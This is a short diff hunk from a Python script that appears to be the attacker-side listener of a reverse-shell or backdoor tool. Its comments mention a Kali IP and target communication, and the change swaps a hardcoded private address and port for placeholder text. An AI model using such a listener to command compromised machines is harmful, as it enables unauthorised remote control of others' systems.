@@ -58,7 +58,7 @@ def target_communication():
 # af_net tells us we make connection of IPV4, stream tells us we use TCP connection
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # bind IP addy(kali) and port
-sock.bind(('192.168.1.12', 5555))
+sock.bind(('ASSIGN LISTENING HOST', ASSIGN LISTENING PORT NUMBER))
 # start listening for incoming connections(5connections) accept new connections
 print('[+] Listening For The Incoming Connections')
 sock.listen(5)
